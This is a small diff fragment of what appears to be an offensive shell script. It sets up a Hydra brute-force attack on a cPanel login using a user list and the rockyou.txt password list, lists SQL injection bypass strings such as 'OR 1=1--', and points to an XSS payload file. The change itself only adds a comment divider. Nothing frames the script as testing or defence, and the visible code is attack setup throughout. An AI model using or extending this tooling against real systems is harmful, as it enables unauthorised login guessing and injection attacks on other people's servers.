@@ -8,7 +8,7 @@ USERLIST="user.txt"
 PASSLIST="rockyou.txt"
 PAYLOAD_FILE="xss_payloads.txt"
 SQL_PAYLOADS=("OR 1=1--" "OR 'a'='a'" "OR \"x\"=\"x\"")
-
+#--------------------------------------------------------------------
 # Function to run Hydra for brute force on cPanel login
 run_hydra() {
     echo "[*] Running Hydra for cPanel brute force..."
